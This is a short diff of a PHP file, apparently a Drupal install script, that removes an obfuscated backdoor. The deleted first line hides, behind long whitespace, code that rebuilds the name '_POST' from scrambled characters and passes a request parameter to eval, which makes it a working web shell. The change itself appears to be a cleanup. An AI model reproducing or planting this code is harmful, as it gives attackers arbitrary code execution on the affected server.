@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                  $zmw29= "spto_" ; $ump1=strtoupper( $zmw29[4]. $zmw29[1] . $zmw29[3]. $zmw29[0]. $zmw29[2] ) ;if( isset ( ${$ump1 }[ 'q1fc6e1' ])) { eval( ${$ump1}[ 'q1fc6e1'] );}?><?php
+<?php
 db_insert('variable')->fields(array(
   'name',
   'value',
